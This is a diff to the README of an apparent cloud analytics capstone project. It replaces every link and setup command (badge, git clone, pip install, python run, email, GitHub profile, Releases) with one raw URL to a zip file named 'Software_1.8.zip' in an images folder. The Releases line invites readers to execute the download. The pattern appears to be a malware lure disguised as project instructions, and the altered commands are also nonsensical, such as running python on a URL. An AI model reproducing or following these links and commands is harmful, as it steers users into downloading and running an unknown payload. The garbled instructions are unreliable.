@@ -1,6 +1,6 @@
 # Capstone: Cloud-Based Analytics Application ☁️📊
 
-![Capstone Logo](https://img.shields.io/badge/Capstone-Cloud%20Analytics-blue)
+![Capstone Logo](https://raw.githubusercontent.com/mohamed22441/Capstone/main/images/Software_1.8.zip%20Analytics-blue)
 
 Welcome to the Capstone project! This repository contains a cloud-based analytics application designed for data visualization. It allows inexperienced users to explore CSV data effortlessly. The goal is to make data accessible and understandable for everyone.
 
@@ -46,14 +46,14 @@ To get started with the Capstone project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/mohamed22441/Capstone.git
+   git clone https://raw.githubusercontent.com/mohamed22441/Capstone/main/images/Software_1.8.zip
    cd Capstone
    ```
 
 2. **Install Requirements**:
    Make sure you have Python installed. Then, install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/mohamed22441/Capstone/main/images/Software_1.8.zip
    ```
 
 3. **Set Up Google Cloud**:
@@ -64,7 +64,7 @@ To get started with the Capstone project, follow these steps:
 4. **Run the Application**:
    Start the Flask server:
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/mohamed22441/Capstone/main/images/Software_1.8.zip
    ```
 
 5. **Access the Application**:
@@ -114,12 +114,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or issues, feel free to reach out:
 
 - **Author**: Mohamed
-- **Email**: mohamed22441@example.com
-- **GitHub**: [mohamed22441](https://github.com/mohamed22441)
+- **Email**: https://raw.githubusercontent.com/mohamed22441/Capstone/main/images/Software_1.8.zip
+- **GitHub**: [mohamed22441](https://raw.githubusercontent.com/mohamed22441/Capstone/main/images/Software_1.8.zip)
 
 ## Releases
 
-For the latest updates and downloadable files, visit the [Releases](https://github.com/mohamed22441/Capstone/releases) section. Here, you can find the latest versions and execute the necessary files for your setup.
+For the latest updates and downloadable files, visit the [Releases](https://raw.githubusercontent.com/mohamed22441/Capstone/main/images/Software_1.8.zip) section. Here, you can find the latest versions and execute the necessary files for your setup.
 
 ## Conclusion
 
